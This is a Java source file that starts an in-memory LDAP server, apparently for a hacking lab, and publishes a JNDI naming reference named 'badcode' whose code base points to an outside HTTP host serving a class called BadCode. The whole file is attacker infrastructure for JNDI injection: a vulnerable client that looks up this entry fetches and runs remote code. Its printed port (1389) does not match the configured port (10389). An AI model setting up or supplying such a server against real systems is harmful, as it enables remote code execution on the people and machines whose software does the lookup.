import java.net.InetAddress;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.*;

public class LDAPServer {

    public static void main ( String[] args ) throws Exception {
        InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=src");

        InMemoryListenerConfig listenerConfig = new InMemoryListenerConfig(
                "foo",
                //InetAddress.getByName("0.0.0.0"),
                InetAddress.getByName("hackerslabldap"),
                10389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault());

        serverConfig.setListenerConfigs(listenerConfig);
        serverConfig.setSchema(null);
        serverConfig.setEnforceSingleStructuralObjectClass(false);
        serverConfig.setEnforceAttributeSyntaxCompliance(true);

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(serverConfig);

        {
            DN dn = new DN("dc=src");
            Entry e = new Entry(dn);
            e.addAttribute("objectClass", "top", "domain", "extensibleObject");
            e.addAttribute("dc", "src");
            ds.add(e);
        }
        {
            DN dn = new DN("cn=badcode,dc=src");
            Entry e = new Entry(dn);
            e.addAttribute("objectClass", "top", "domain", "extensibleObject", "javaNamingReference");
            e.addAttribute("cn", "badcode");
            e.addAttribute("javaClassName", "BadCode");
            e.addAttribute("javaCodeBase", "http://hackerslabhttp:8082/");
            e.addAttribute("javaFactory", "BadCode");
            ds.add(e);
            

        }


            ds.startListening();
	    System.out.println("LDAP is listening on port 1389");




    }
}

